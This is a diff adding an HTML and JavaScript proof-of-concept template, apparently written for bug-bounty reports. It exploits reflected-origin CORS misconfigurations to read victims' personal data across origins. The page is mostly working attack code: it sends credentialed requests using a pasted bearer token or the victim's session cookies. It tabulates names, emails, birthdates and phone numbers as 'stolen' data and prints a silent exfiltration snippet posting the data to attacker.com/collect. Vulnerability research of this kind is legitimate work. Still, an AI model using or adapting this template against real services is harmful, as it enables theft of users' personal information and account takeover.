@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS PII Theft PoC - [TARGET] - dividesbyzer0</title>
+<!--
+  CORS Cross-Origin Data Theft PoC Template
+  Researcher: dividesbyzer0
+  Usage: Fill in CONFIG below, serve via HTTP server, click the button.
+
+  CONFIGURATION:
+  1. Set TARGET_URL to the endpoint that returns sensitive data with reflected CORS
+  2. Set AUTH_TYPE to "bearer" or "cookie" depending on how the endpoint authenticates
+  3. If bearer: paste a valid token into TOKEN
+  4. If cookie: victim must have an active session (credentials: include handles it)
+  5. Set PII_FIELDS to match the JSON keys the endpoint returns
+  6. Update the title, meta, and description text for the specific target
+  7. Serve: python3 -m http.server 8888
+  8. Open: http://localhost:8888/cors-poc-template.html
+-->
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #c0c0c0; padding: 30px; max-width: 960px; margin: 0 auto; }
+h1 { color: #ff4444; font-size: 22px; margin-bottom: 5px; }
+h2 { color: #ff8800; font-size: 16px; margin: 20px 0 10px; }
+.meta { color: #666; font-size: 13px; margin-bottom: 20px; }
+.panel { background: #111; border: 1px solid #333; border-radius: 4px; padding: 15px; margin: 10px 0; }
+.stolen { border: 2px solid #ff0000; background: #1a0000; }
+.cors { border-left: 4px solid #ff8800; }
+.info { border-left: 4px solid #4488ff; }
+.banner { background: #ff0000; color: #fff; text-align: center; padding: 15px; font-size: 18px; font-weight: bold; margin: 15px 0; border-radius: 4px; }
+label { color: #888; font-size: 13px; }
+input { background: #1a1a1a; border: 1px solid #444; color: #00ff00; font-family: monospace; font-size: 13px; padding: 8px; width: 100%; margin: 5px 0 15px; }
+button { background: #ff4444; color: #fff; border: none; padding: 12px 30px; cursor: pointer; font-family: monospace; font-size: 15px; font-weight: bold; margin: 5px 5px 5px 0; border-radius: 3px; }
+button:hover { background: #ff6666; }
+pre { background: #000; padding: 12px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; font-size: 13px; line-height: 1.5; margin: 5px 0; }
+table { border-collapse: collapse; width: 100%; margin: 10px 0; }
+td, th { padding: 10px 15px; border-bottom: 1px solid #333; font-size: 14px; text-align: left; }
+th { color: #ff8800; font-size: 12px; text-transform: uppercase; }
+td.label-cell { color: #aaa; width: 200px; font-weight: bold; }
+td.value-cell { color: #00ff00; font-size: 15px; font-weight: bold; }
+td.impact-cell { color: #ff6666; font-size: 12px; font-style: italic; }
+.ok { color: #00ff00; }
+.fail { color: #ff4444; }
+.warn { color: #ffcc00; }
+.header-name { color: #ff8800; }
+.header-value { color: #ffcc00; }
+.step-num { display: inline-block; background: #ff4444; color: #fff; width: 28px; height: 28px; text-align: center; line-height: 28px; border-radius: 50%; font-weight: bold; margin-right: 8px; }
+</style>
+</head>
+<body>
+
+<h1>[TARGET NAME] - Cross-Origin Data Theft via CORS Misconfiguration</h1>
+<p class="meta">Researcher: dividesbyzer0 | Target: [target.domain.com] | CWE-942</p>
+
+<div class="panel info">
+<h2>What This Page Does</h2>
+<p style="line-height:1.6">This page is hosted on an <b>attacker-controlled origin</b> (your local machine, not the target's servers).
+When you click the button below, JavaScript on this page makes a <b>cross-origin request</b> to the target's
+production server and <b>reads the full API response</b> containing the victim's personal information.
+This should not be possible. The browser's Same-Origin Policy should block it. But the target server
+reflects any Origin in its CORS headers, so the browser allows the read.</p>
+</div>
+
+<div class="panel" id="token-panel">
+<h2><span class="step-num">1</span> Bearer Token</h2>
+<label>This token was obtained from the victim's OAuth/API session:</label>
+<input type="text" id="token" placeholder="eyJ..." />
+<p style="color:#666;font-size:12px">Pre-filled with a valid test account token. For triage: authenticate as the test account and extract the access_token.</p>
+</div>
+
+<div class="panel">
+<h2><span class="step-num">2</span> Execute the Attack</h2>
+<p style="margin-bottom:10px;color:#aaa">Click the button. Watch this page read the victim's data from the target server, cross-origin, in your browser.</p>
+<button onclick="stealPII()" id="btn-steal">STEAL USER DATA CROSS-ORIGIN</button>
+</div>
+
+<div id="results"></div>
+
+<script>
+// ============================================================
+// CONFIG - Edit these values for each target
+// ============================================================
+
+var CONFIG = {
+    // The vulnerable endpoint URL
+    target_url: 'https://TARGET.DOMAIN.COM/PATH/TO/ENDPOINT',
+
+    // "bearer" = sends Authorization header (triggers preflight)
+    // "cookie" = sends credentials:include (uses victim's session cookies)
+    auth_type: 'bearer',
+
+    // If auth_type is "bearer", paste a valid token here
+    token: '',
+
+    // JSON fields to display in the stolen data table.
+    // key: the JSON response key
+    // label: display name in the table
+    // risk: short impact note for triage
+    pii_fields: [
+        { key: 'name',               label: 'Full Name',         risk: 'Identity theft, social engineering' },
+        { key: 'email',              label: 'Email Address',      risk: 'Phishing, credential stuffing, account takeover' },
+        { key: 'birthdate',          label: 'Date of Birth',      risk: 'KYC bypass, identity verification fraud' },
+        { key: 'preferred_username', label: 'Login Username',     risk: 'Targeted credential attacks' },
+        { key: 'customer_id',        label: 'Internal User ID',   risk: 'Internal system reference, IDOR pivot' },
+        { key: 'sub',                label: 'Auth Provider ID',   risk: 'SSO identity, cross-app correlation' },
+        { key: 'phone',              label: 'Phone Number',       risk: 'SIM swap, vishing' }
+    ]
+};
+
+// ============================================================
+// END CONFIG - No changes needed below this line
+// ============================================================
+
+if (CONFIG.token) {
+    document.getElementById('token').value = CONFIG.token;
+}
+if (CONFIG.auth_type === 'cookie') {
+    document.getElementById('token-panel').innerHTML =
+        '<h2><span class="step-num">1</span> Cookie-Based Auth</h2>' +
+        '<p style="color:#aaa">This endpoint uses cookie authentication. The victim must have an active session ' +
+        'at the target domain. The browser sends their cookies automatically via <code>credentials: include</code>.</p>';
+}
+
+function getToken() {
+    var el = document.getElementById('token');
+    return el ? el.value.trim() : '';
+}
+
+function addResult(html) {
+    var div = document.createElement('div');
+    div.innerHTML = html;
+    document.getElementById('results').appendChild(div);
+}
+
+function esc(s) {
+    if (!s) return '';
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+function stealPII() {
+    document.getElementById('results').innerHTML = '';
+    var token = getToken();
+    var origin = window.location.origin || (window.location.protocol + '//' + window.location.host);
+
+    var fetchOpts = { method: 'GET' };
+    var authLine = '';
+
+    if (CONFIG.auth_type === 'bearer') {
+        fetchOpts.headers = { 'Authorization': 'Bearer ' + token };
+        authLine = '<span class="header-name">Authorization:</span> Bearer ' + esc(token.substring(0, 50)) + '...\n';
+    } else {
+        fetchOpts.credentials = 'include';
+        authLine = '<span class="header-name">Credentials:</span> include (browser sends victim\'s cookies)\n';
+    }
+
+    addResult(
+        '<div class="panel cors">' +
+        '<h2><span class="step-num">A</span> Sending Cross-Origin Request</h2>' +
+        '<pre>' +
+        '<span class="header-name">GET</span> ' + esc(CONFIG.target_url) + '\n' +
+        '<span class="header-name">Origin:</span>        <span class="header-value">' + esc(origin) + '</span>  (THIS PAGE, not the target)\n' +
+        authLine + '\n' +
+        'The browser is about to send this request cross-origin.\n' +
+        'If Bearer auth: browser sends an OPTIONS preflight first.\n' +
+        'If Cookie auth: browser sends cookies with credentials:include.\n' +
+        'If the server reflects our origin, the browser lets JavaScript read the response.' +
+        '</pre></div>'
+    );
+
+    fetch(CONFIG.target_url, fetchOpts)
+    .then(function(response) {
+        var corsOrigin = response.headers.get('access-control-allow-origin');
+        var corsCredentials = response.headers.get('access-control-allow-credentials');
+
+        addResult(
+            '<div class="panel cors">' +
+            '<h2><span class="step-num">B</span> Server Response - CORS Headers</h2>' +
+            '<pre>' +
+            '<span class="header-name">HTTP</span> ' + response.status + '\n' +
+            '<span class="header-name">Access-Control-Allow-Origin:</span>      <span class="header-value">' + esc(corsOrigin) + '</span>\n' +
+            '<span class="header-name">Access-Control-Allow-Credentials:</span> <span class="header-value">' + esc(corsCredentials) + '</span>\n\n' +
+            (corsOrigin === origin
+                ? '<span class="ok">The server reflected our attacker origin. The browser allowed the cross-origin read.</span>'
+                : corsOrigin
+                    ? '<span class="warn">CORS header value: ' + esc(corsOrigin) + '</span>'
+                    : '<span class="fail">No Access-Control-Allow-Origin header present. CORS blocked.</span>') +
+            '</pre></div>'
+        );
+
+        if (response.status === 200) {
+            return response.json().then(function(data) {
+
+                var html = '<div class="banner">VICTIM DATA SUCCESSFULLY STOLEN FROM ATTACKER-CONTROLLED PAGE</div>';
+
+                html += '<div class="panel stolen">';
+                html += '<h2><span class="step-num">C</span> Exfiltrated Personal Information</h2>';
+                html += '<p style="color:#ff6666;margin-bottom:10px">The following data was read cross-origin by this attacker page from the target\'s production server:</p>';
+                html += '<table>';
+                html += '<tr><th>Field</th><th>Stolen Value</th><th>Risk</th></tr>';
+
+                CONFIG.pii_fields.forEach(function(f) {
+                    var val = data;
+                    f.key.split('.').forEach(function(k) { if (val) val = val[k]; });
+                    if (val !== undefined && val !== null) {
+                        html += '<tr><td class="label-cell">' + esc(f.label) + '</td>';
+                        html += '<td class="value-cell">' + esc(String(val) || '(empty)') + '</td>';
+                        html += '<td class="impact-cell">' + esc(f.risk) + '</td></tr>';
+                    }
+                });
+
+                var extraKeys = Object.keys(data).filter(function(k) {
+                    return !CONFIG.pii_fields.some(function(f) { return f.key === k || f.key.split('.')[0] === k; });
+                });
+                extraKeys.forEach(function(k) {
+                    html += '<tr><td class="label-cell">' + esc(k) + '</td>';
+                    html += '<td class="value-cell">' + esc(String(data[k])) + '</td>';
+                    html += '<td class="impact-cell">(additional field)</td></tr>';
+                });
+
+                html += '</table>';
+                html += '</div>';
+
+                html += '<div class="panel stolen">';
+                html += '<h2>Complete Raw JSON Response (read by attacker page)</h2>';
+                html += '<pre style="color:#00ff00;font-size:14px">' + esc(JSON.stringify(data, null, 2)) + '</pre>';
+                html += '</div>';
+
+                html += '<div class="panel cors">';
+                html += '<h2>What Just Happened</h2>';
+                html += '<pre style="line-height:1.8">';
+                html += '<span class="ok">1.</span> This page is hosted on <span class="header-value">' + esc(origin) + '</span> (attacker origin).\n';
+                html += '<span class="ok">2.</span> JavaScript sent a GET request to <span class="header-value">' + esc(CONFIG.target_url) + '</span>.\n';
+                if (CONFIG.auth_type === 'bearer') {
+                    html += '<span class="ok">3.</span> The browser sent an OPTIONS preflight first. The server responded:\n';
+                    html += '   Access-Control-Allow-Origin: <span class="header-value">' + esc(origin) + '</span>\n';
+                    html += '   Access-Control-Allow-Headers: <span class="header-value">Authorization, Content-Type</span>\n';
+                    html += '   Access-Control-Allow-Credentials: <span class="header-value">true</span>\n';
+                    html += '<span class="ok">4.</span> The browser saw the preflight pass and sent the real GET with the Bearer token.\n';
+                } else {
+                    html += '<span class="ok">3.</span> The browser sent the victim\'s session cookies via credentials:include.\n';
+                    html += '<span class="ok">4.</span> The server authenticated the request using those cookies.\n';
+                }
+                html += '<span class="ok">5.</span> The server returned HTTP 200 with the user\'s data in the JSON body.\n';
+                html += '<span class="ok">6.</span> The browser checked ACAO on the response: <span class="header-value">' + esc(corsOrigin) + '</span>.\n';
+                html += '<span class="ok">7.</span> Because ACAO matches our origin, the browser let JavaScript read the entire response.\n';
+                html += '<span class="ok">8.</span> <span class="fail">All of the victim\'s personal data is now in the attacker\'s hands.</span>';
+                html += '</pre>';
+                html += '</div>';
+
+                html += '<div class="panel info">';
+                html += '<h2>Silent Exfiltration (what a real attacker does next)</h2>';
+                html += '<pre style="color:#aaa">';
+                html += 'var stolen = ' + esc(JSON.stringify(data)) + ';\n\n';
+                html += 'fetch("https://attacker.com/collect", {\n';
+                html += '    method: "POST",\n';
+                html += '    headers: { "Content-Type": "application/json" },\n';
+                html += '    body: JSON.stringify(stolen)\n';
+                html += '});\n\n';
+                html += 'The victim sees nothing. No popup, no redirect, no indication.\n';
+                html += 'The attacker now has the victim\'s full personal data.';
+                html += '</pre>';
+                html += '</div>';
+
+                addResult(html);
+            });
+        } else if (response.status === 401 || response.status === 403) {
+            addResult(
+                '<div class="panel">' +
+                '<pre class="warn">[!] HTTP ' + response.status + ' - Authentication failed.\n\n' +
+                'If Bearer: token may be expired. Get a fresh one and paste it above.\n' +
+                'If Cookie: victim may not have an active session at the target domain.</pre></div>'
+            );
+        } else {
+            return response.text().then(function(t) {
+                addResult('<div class="panel"><pre class="fail">[-] HTTP ' + response.status + ':\n' + esc(t) + '</pre></div>');
+            });
+        }
+    })
+    .catch(function(err) {
+        addResult(
+            '<div class="panel">' +
+            '<pre class="fail">[-] Fetch error: ' + esc(err.message) + '\n\n' +
+            'If you opened this file directly (file://), the browser blocks cross-origin requests.\n' +
+            'Serve it from a local HTTP server instead:\n\n' +
+            '  python3 -m http.server 8888\n' +
+            '  Open http://localhost:8888/cors-poc-template.html\n\n' +
+            'This simulates an attacker hosting the page on their own domain.</pre></div>'
+        );
+    });
+}
+</script>
+</body>
+</html>
